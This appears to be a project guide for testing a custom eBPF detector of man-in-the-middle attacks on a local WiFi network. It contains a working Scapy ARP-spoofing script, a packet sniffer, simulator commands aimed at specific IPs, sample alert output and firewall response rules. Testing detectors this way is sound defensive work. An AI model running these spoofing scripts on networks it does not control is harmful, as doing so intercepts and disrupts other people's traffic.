# External Device MITM Attack Simulation Guide

## Target System Information

**Target IP:** 10.220.184.64  
**Gateway IP:** 10.220.184.57  
**Interface:** wlp0s20f3 (WiFi)  
**Network:** 10.220.184.0/24

---

## Prerequisites

### On Your EXTERNAL Attack Device

You'll need:
1. Same network (10.220.184.0/24)
2. Python 3.8+
3. Scapy library
4. Root/sudo privileges

### Installation on External Device

```bash
# On the attacking device (laptop, phone, etc.)
sudo apt-get update
sudo apt-get install -y python3 python3-pip python3-venv

# Create environment
python3 -m venv attack_env
source attack_env/bin/activate

# Install Scapy
pip install scapy
```

---

## Method 1: Copy Simulator to External Device

### Step 1: Transfer the simulator

On **TARGET (10.220.184.64)** - this system:
```bash
# From /home/inba/SIA_BANK directory
scp ebpf/simulate_mitm_attacks.py user@ATTACKER_IP:/home/user/
```

Or use USB drive:
```bash
cp /home/inba/SIA_BANK/ebpf/simulate_mitm_attacks.py /media/usb/
```

### Step 2: On EXTERNAL ATTACKER device

```bash
# Activate Python environment
source attack_env/bin/activate

# Run ARP spoofing from external device
sudo -E python3 simulate_mitm_attacks.py \
    --target 10.220.184.64 \
    --gateway 10.220.184.57 \
    --attack-type arp \
    --duration 60 \
    --output attack-log.jsonl

# Or dual ARP (MITM positioning)
sudo -E python3 simulate_mitm_attacks.py \
    --target 10.220.184.64 \
    --gateway 10.220.184.57 \
    --attack-type dual-arp \
    --duration 60
```

### Step 3: On TARGET (this system) - Monitor detections

```bash
cd /home/inba/SIA_BANK
source mitm_venv/bin/activate

# Start detector
sudo -E python3 ebpf/detect_mitm_attacks.py \
    --interface wlp0s20f3 \
    --output logs/mitm-attacks.jsonl &

# Watch for alerts
tail -f logs/mitm-attacks.jsonl | jq .
```

---

## Method 2: Use Manual Commands on External Device

### Simple Python Script for External Device

Create `external_attack.py` on your attacking device:

```python
#!/usr/bin/env python3
"""
Simple ARP Spoofing Attack from External Device
Target: 10.220.184.64
Gateway: 10.220.184.57
"""

from scapy.all import *
import time
import sys

def arp_spoof(target_ip, gateway_ip, count=100, interval=0.5):
    """
    Send spoofed ARP packets to target
    """
    print(f"[*] Starting ARP spoofing attack")
    print(f"    Target: {target_ip}")
    print(f"    Gateway: {gateway_ip}")
    print(f"    Packets: {count}")
    
    # Get attacker MAC (this device)
    attacker_mac = get_if_hwaddr(conf.iface)
    print(f"    Attacker MAC: {attacker_mac}")
    
    try:
        for i in range(count):
            # Create spoofed ARP reply
            # Claiming to be the gateway
            arp_response = ARP(
                op=2,  # is-at (response)
                pdst=target_ip,  # Target IP
                hwdst="ff:ff:ff:ff:ff:ff",  # Broadcast
                psrc=gateway_ip,  # Claim to be gateway
                hwsrc=attacker_mac  # Our MAC
            )
            
            # Send packet
            send(arp_response, verbose=False)
            
            if (i + 1) % 10 == 0:
                print(f"[+] Sent {i + 1}/{count} spoofed ARP packets")
            
            time.sleep(interval)
        
        print(f"\n[✓] Attack complete - sent {count} packets")
        print(f"[!] Target {target_ip} should now see gateway as {attacker_mac}")
        
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted")
    except Exception as e:
        print(f"\n[!] Error: {e}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] This script must be run as root/sudo")
        sys.exit(1)
    
    TARGET_IP = "10.220.184.64"
    GATEWAY_IP = "10.220.184.57"
    
    print("=" * 60)
    print("  ARP Spoofing Attack Simulator")
    print("  ⚠️  FOR AUTHORIZED TESTING ONLY")
    print("=" * 60)
    print()
    
    arp_spoof(TARGET_IP, GATEWAY_IP, count=50)
```

Run on external device:
```bash
# Make executable
chmod +x external_attack.py

# Run attack
sudo python3 external_attack.py
```

---

## Method 3: Packet Sniffing from External Device

### Packet Capture Script

Create `external_sniffer.py`:

```python
#!/usr/bin/env python3
from scapy.all import *
import time

TARGET_IP = "10.220.184.64"

def packet_callback(packet):
    if packet.haslayer(IP):
        if packet[IP].src == TARGET_IP or packet[IP].dst == TARGET_IP:
            print(f"[Captured] {packet[IP].src} → {packet[IP].dst} | Protocol: {packet[IP].proto}")

print(f"[*] Sniffing packets to/from {TARGET_IP}")
print("[!] This should trigger packet sniffing detection on target")

sniff(filter=f"host {TARGET_IP}", prn=packet_callback, count=100)
```

Run on external device:
```bash
sudo python3 external_sniffer.py
```

---

## What the Target System Will Detect

When you run attacks from external device, the **target system (10.220.184.64)** should detect:

### 1. ARP Spoofing Detection
```json
{
  "timestamp": "2026-03-08T...",
  "attack_type": "ARP_SPOOFING_DETECTED",
  "severity": "CRITICAL",
  "attacker_ip": "EXTERNAL_DEVICE_IP",
  "attacker_mac": "EXTERNAL_DEVICE_MAC",
  "gateway_ip": "10.220.184.57",
  "indicators": [
    "MAC address mismatch",
    "Duplicate ARP responses"
  ],
  "action": "Block immediately"
}
```

### 2. MAC Spoofing Detection
```json
{
  "attack_type": "MAC_SPOOFING_DETECTED",
  "severity": "HIGH",
  "attacker_ip": "10.220.184.57",
  "old_mac": "REAL_GATEWAY_MAC",
  "new_mac": "ATTACKER_MAC",
  "action": "Block and alert"
}
```

### 3. Packet Sniffing Detection
```json
{
  "attack_type": "PACKET_SNIFFING_DETECTED",
  "severity": "HIGH",
  "attacker_ip": "EXTERNAL_DEVICE_IP",
  "tool_signature": "tcpdump",
  "indicators": [
    "Unusual packet timing variance"
  ]
}
```

---

## Network Requirements

### Both devices must:
- ✅ Be on same network (10.220.184.0/24)
- ✅ Be on same subnet (can reach each other)
- ✅ Support ARP protocol (Ethernet/WiFi, not loopback)

### Attacker device needs:
- ✅ Root/sudo access
- ✅ Python 3 + Scapy
- ✅ Network interface in promiscuous mode

---

## Safety and Legal Warnings

⚠️ **CRITICAL WARNINGS:**

1. **Only test on networks you own/control**
2. **Get explicit permission before testing**
3. **ARP attacks can disrupt network services**
4. **May violate Computer Fraud and Abuse Act (CFAA) if unauthorized**
5. **Could trigger security alarms in production networks**

### Authorized Testing Only

This is intended for:
- ✅ Your own test network
- ✅ Lab/sandbox environments
- ✅ Security testing with written authorization
- ✅ Educational purposes in isolated networks

**NOT for:**
- ❌ Public networks
- ❌ Corporate networks (without permission)
- ❌ Networks you don't own
- ❌ Any unauthorized testing

---

## Troubleshooting

### If attacks aren't detected:

1. **Check network connectivity:**
   ```bash
   # On target
   ping ATTACKER_IP
   
   # On attacker
   ping 10.220.184.64
   ```

2. **Verify interface is correct:**
   ```bash
   # On target - should be wlp0s20f3
   ip addr show wlp0s20f3
   ```

3. **Check detector is running:**
   ```bash
   # On target
   ps aux | grep detect_mitm
   ```

4. **Monitor ARP cache changes:**
   ```bash
   # On target - watch for MAC changes
   watch -n 1 'ip neigh show | grep 10.220.184.57'
   ```

5. **Check firewall rules:**
   ```bash
   # Ensure not blocking packets
   sudo iptables -L
   ```

---

## Complete Test Scenario

### Terminal 1 (Target - 10.220.184.64):
```bash
cd /home/inba/SIA_BANK
source mitm_venv/bin/activate

# Start detector
sudo -E python3 ebpf/detect_mitm_attacks.py \
    --interface wlp0s20f3 \
    --output logs/mitm-attacks.jsonl \
    --verbose
```

### Terminal 2 (Target - 10.220.184.64):
```bash
# Watch for alerts
tail -f /home/inba/SIA_BANK/logs/mitm-attacks.jsonl | jq .
```

### Terminal 3 (External Attacker Device):
```bash
# Run ARP spoofing attack
sudo python3 simulate_mitm_attacks.py \
    --target 10.220.184.64 \
    --gateway 10.220.184.57 \
    --attack-type arp \
    --count 30
```

You should see alerts appear in Terminal 2 within seconds!

---

## Response Actions

Once attack is detected, target system can:

### 1. Block attacker IP:
```bash
sudo iptables -I INPUT -s ATTACKER_IP -j DROP
sudo iptables -I OUTPUT -d ATTACKER_IP -j DROP
```

### 2. Block attacker MAC:
```bash
sudo ebtables -A INPUT -s ATTACKER_MAC -j DROP
```

### 3. Reset ARP cache:
```bash
sudo ip neigh flush dev wlp0s20f3
```

### 4. Send alerts:
```bash
# Email alert
echo "MITM attack detected from $ATTACKER_IP" | mail -s "Security Alert" admin@example.com

# Slack alert
curl -X POST https://hooks.slack.com/... \
    -d '{"text":"🚨 MITM attack detected!"}'
```

---

## Summary

**Target System (this machine):** 10.220.184.64  
**Detection Interface:** wlp0s20f3  
**Gateway:** 10.220.184.57

**External Attacker Device:**
- Must be on same network (10.220.184.0/24)
- Run simulator or custom scripts
- Attack will be detected in real-time

**Expected Detections:**
- ARP spoofing → CRITICAL alert
- MAC spoofing → HIGH alert  
- Packet sniffing → HIGH alert

All attacks logged to: `/home/inba/SIA_BANK/logs/mitm-attacks.jsonl`
